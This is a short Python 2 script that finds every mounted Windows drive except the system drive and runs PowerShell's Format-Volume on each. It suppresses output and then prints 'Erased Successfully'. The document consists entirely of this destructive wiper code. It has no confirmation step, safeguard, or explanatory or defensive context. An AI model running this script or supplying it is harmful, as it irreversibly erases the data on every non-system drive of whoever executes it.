import os, string , subprocess ,sys
a = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
e=os.environ['SYSTEMDRIVE']
a.remove(e)
b= ''.join(a)
c = b.split(":")
for i in range(0,len(c)-1):
    d='Format-Volume -DriveLetter'+' '+c[i]
    process=subprocess.Popen(["powershell",d],stdout=subprocess.PIPE,stderr=subprocess.PIPE);
    out, err = process.communicate()
print "Erased Successfully"
